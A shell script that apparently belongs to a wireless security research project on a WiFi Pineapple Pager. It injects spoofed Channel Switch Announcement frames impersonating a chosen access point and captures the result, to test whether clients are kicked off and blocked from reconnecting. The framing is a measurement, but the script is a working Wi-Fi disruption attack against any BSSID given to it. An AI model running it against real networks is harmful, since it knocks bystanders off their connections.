#!/bin/sh
# run_17a.sh -- day-one step 17a, run ON THE PAGER, one arm at a time.
#
# THE QUESTION. pineapd's CSA carries Channel Switch Count 0, and
# ieee80211_mgd_csa_present() discards a count-0 CSA before the auth/assoc refusal check, so
# pineapd's CSA can kick a client but can never deny it a reconnection. That reading is [A] --
# never measured on anything. This script is the measurement: same frame, same target, count 0
# against count 3.
#
# A SECOND, INDEPENDENT BLOCKER, found 2026-11-09 and worth knowing before you read a null result:
# pineapd also hardcodes the New Channel Number to 14 (li a3,14 at 0x473634) -- 2484 MHz,
# Japan-only, 11b-only, absent from the US table -- so a client that DID honour pineapd's element
# would be told to move somewhere it may not go. pagerinj lets you name a legal channel, which is
# why the <announce-chan> argument is mandatory here and has no default.
#
# WHY IT STOPS PINEAPD. pagerinj never changes the channel and holds no regulatory opinion; that is
# the point of it. But pineapd hops the interface out from under the capture, and its own CSA flood
# is a CSA-bearing clone source that pagerinj deliberately skips. dev/injector/README.md says to
# stop it, so this script does, and puts it back on every exit path including Ctrl-C.
#
# WHAT IT DOES NOT DO. It does not tell you whether a frame reached the air. sendto() returning
# success proves nothing -- a cfg80211-blocked frame is freed and the path returns NETDEV_TX_OK.
# Pass a <watch-if> to capture, or better, use an external receiver. On 2.4 GHz wlan0mon can watch
# while wlan1mon injects; on 5 GHz it cannot (radio0 is 2g, receive-only), so there you need the
# external receiver and this script's capture argument is useless.
#
# Usage:
#   ./run_17a.sh <inject-if> <bssid> <target-chan> <announce-chan> <count> [watch-if]
#
#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 0 wlan0mon     # the count-0 control
#   ./run_17a.sh wlan1mon FC:58:5A:08:42:15 8 1 3 wlan0mon     # the arm that should differ
#
# Run the control FIRST, reconnect the client, then the count-3 arm. One arm per invocation on
# purpose: the thing you are measuring is a client's behaviour, and that needs you watching it,
# not a script deciding when to move on.

set -u

PAGERINJ="${PAGERINJ:-/root/pagerinj}"

die() { printf '%s\n' "$*" >&2; exit 1; }

[ $# -ge 5 ] || die "usage: $0 <inject-if> <bssid> <target-chan> <announce-chan> <count> [watch-if]"
IF="$1"; BSSID="$2"; TCHAN="$3"; ACHAN="$4"; COUNT="$5"; WIF="${6:-}"

[ -x "$PAGERINJ" ] || die "no injector at $PAGERINJ (set PAGERINJ=/path to override)"
case "$BSSID" in
  [0-9A-Fa-f][0-9A-Fa-f]:*:*:*:*:[0-9A-Fa-f][0-9A-Fa-f]) ;;
  *) die "bssid does not look like a MAC: $BSSID" ;;
esac
[ "$TCHAN" -gt 0 ] 2>/dev/null || die "target-chan must be a positive number"
[ "$ACHAN" -gt 0 ] 2>/dev/null || die "announce-chan must be a positive number"
[ "$TCHAN" != "$ACHAN" ] || die "announce-chan must differ from target-chan: a same-channel CSA announces no move, and pagerinj refuses it"

# 2.4 GHz channel -> centre MHz. Only 1-14, because that is the band where the Pager can both
# inject and watch; anything else you must tune by hand and pass the frequency yourself.
mhz_for() {
  if [ "$1" -ge 1 ] 2>/dev/null && [ "$1" -le 13 ]; then
    echo $(( 2407 + 5 * $1 ))
  elif [ "$1" = 14 ]; then echo 2484
  else echo ""; fi
}
FREQ="${FREQ:-$(mhz_for "$TCHAN")}"
[ -n "$FREQ" ] || die "cannot map channel $TCHAN to a frequency; pass FREQ=<MHz> yourself"

PINEAPD_WAS_UP=0
pidof pineapd >/dev/null 2>&1 && PINEAPD_WAS_UP=1
CAP=""

restore() {
  [ -n "$CAP" ] && kill "$CAP" 2>/dev/null
  if [ "$PINEAPD_WAS_UP" = 1 ]; then
    printf -- '-- restarting pineapd\n' >&2
    /etc/init.d/pineapd start >/dev/null 2>&1 || printf 'WARNING: pineapd did not restart; start it by hand\n' >&2
  fi
}
trap restore EXIT INT TERM

printf -- '-- target %s ch %s (%s MHz); announcing ch %s with count %s on %s\n' \
  "$BSSID" "$TCHAN" "$FREQ" "$ACHAN" "$COUNT" "$IF" >&2

if [ "$PINEAPD_WAS_UP" = 1 ]; then
  printf -- '-- stopping pineapd (it hops %s and its own CSA flood is a clone source)\n' "$IF" >&2
  /etc/init.d/pineapd stop >/dev/null 2>&1
  sleep 2
fi

printf -- '-- parking %s on %s MHz\n' "$IF" "$FREQ" >&2
iw dev "$IF" set freq "$FREQ" 20 2>/dev/null || printf 'WARNING: could not set freq; pagerinj uses whatever is there\n' >&2

OUT="/root/loot/csa_17a_c${COUNT}_$(date +%s 2>/dev/null || echo now).pcap"
if [ -n "$WIF" ]; then
  mkdir -p /root/loot 2>/dev/null
  iw dev "$WIF" set freq "$FREQ" 20 2>/dev/null
  # Beacons AND action frames: a count-bearing CSA can arrive either way, and 17c's unicast arm is
  # an action frame. -s 0 because the element sits past anything a short snap would keep.
  tcpdump -i "$WIF" -nn -e -s 0 -w "$OUT" \
    "(type mgt and subtype beacon or subtype action) and wlan addr2 $BSSID" >/dev/null 2>&1 &
  CAP=$!
  sleep 1
  printf -- '-- capturing on %s -> %s\n' "$WIF" "$OUT" >&2
fi

printf -- '-- firing\n' >&2
"$PAGERINJ" -i "$IF" --csa --bssid "$BSSID" --chan "$ACHAN" --count "$COUNT" --secs 10
RC=$?

if [ -n "$CAP" ]; then
  sleep 1; kill "$CAP" 2>/dev/null; wait "$CAP" 2>/dev/null; CAP=""
  printf -- '-- capture: %s (%s bytes)\n' "$OUT" "$(wc -c <"$OUT" 2>/dev/null || echo 0)" >&2
  printf -- '-- read the count byte with:  tcpdump -r %s -nn -e -vvv | head -40\n' "$OUT" >&2
fi

printf -- '-- pagerinj rc=%s. sendto success does NOT mean transmitted: confirm at the receiver.\n' "$RC" >&2
printf -- '-- now: did the client drop, and can it re-associate? That is the measurement.\n' >&2
exit "$RC"
